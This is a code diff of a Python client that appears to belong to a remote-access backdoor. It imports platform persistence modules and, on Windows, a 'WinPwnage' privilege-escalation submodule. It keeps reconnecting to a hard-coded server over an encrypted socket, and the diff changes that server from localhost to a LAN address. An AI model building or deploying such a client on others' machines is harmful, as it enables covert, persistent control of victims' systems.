@@ -9,13 +9,13 @@ import socket
 import os
 import sys
 
-import cryptography
+from cryptography.fernet import InvalidToken
 
 # append path, needed for all 'main' files
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))
 
 from src.args import Args
-from src import errors
+from src import errors, helper
 
 from src.definitions import platforms
 
@@ -23,11 +23,14 @@ if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
     from src.client.persistence.unix import Unix as Persistence
 elif platforms.OS == platforms.WINDOWS:
     from src.client.persistence.windows import Windows as Persistence
+
+    # import all submodules
+    helper.init_submodule("WinPwnage")
 else:
     print("Platform not supported")
     sys.exit(0)
 
-from src.client.socket import Socket
+from src.client.client import Client
 from src import logger
 
 
@@ -38,7 +41,7 @@ class MainClient:
         self._args = Args(self)
         logger.init(self._args.get_args())
 
-        self.socket = None
+        self.client = None
         self.host = socket.gethostbyname(host) if is_host_name else host
         self.port = port
 
@@ -54,15 +57,15 @@ class MainClient:
             pass
 
     def start(self):
-        self.socket = Socket(self.host, self.port)
+        self.client = Client(self.host, self.port)
 
         try:
-            self.socket.connect()
-        except (cryptography.fernet.InvalidToken, socket.error):  # if the server closes without warning
-            self.socket.close()
-            del self.socket
+            self.client.connect()
+        except (InvalidToken, socket.error):  # if the server closes without warning
+            self.client.es.socket.close()
+            del self.client
             self.start()
 
 
 if __name__ == "__main__":
-    MainClient('127.0.0.1', 3000, False, False, False).start()
+    MainClient('192.168.10.16', 3000, False, False, False).start()
